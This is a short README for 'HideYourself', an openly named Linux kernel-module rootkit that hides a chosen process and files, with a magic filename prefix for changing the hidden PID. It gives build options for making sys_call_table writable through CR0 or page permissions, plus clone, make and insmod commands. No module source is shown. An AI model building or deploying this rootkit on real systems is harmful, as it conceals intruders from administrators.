# HideYourself 

## Features

- Hide a process
-  Hide files by name [HIDDEN_NAME] 
- Dynamicly change the hidden process by 'cat'ting  on a string that strart with [CONTROL_PREFIX] and followed by the new `hidden_pid`.
  for example, if "HIDE_ME_" is the [CONTROL_PREFIX]: `cat HIDE_ME_<hide_pid>`.

## installation

### Build

The Makefile gets 3 parameters:
    
[USE_CR0] gets either 1 or 0, choosing the method to change the sys_call_table
    permissions. When set to 1, it changes the value of the register CR0, and otherwise by changing the permmisions to the page of the sys_call_table.

[HIDDEN_NAME] files with this name will be hidden.

[CONTROL_PREFIX] an openat syscall with a filename argument starting with CONTROL_PREFIX will be used a control magic.
    
```shell
$ git clone https://github.com/sschwartzer/hideyourself
$ cd hideyourself/
$ make USE_CR0=<0/1> HIDDEN_NAME=<HIDDEN_FILE_NAME> CONTROL_PREFIX=<MAGIC_PREFIX>
```

### Loading LKM:

```shell
$ dmesg -C # clears all messages from the kernel ring buffer
$ insmod main.ko
$ dmesg # verify that rootkit has been loaded
```

### Unloading LKM:

```shell
$ rmmod main
$ dmesg # verify that rootkit has been unloaded
```

tested on kernel 5.4.0 Ubuntu 20.04.6 LTS
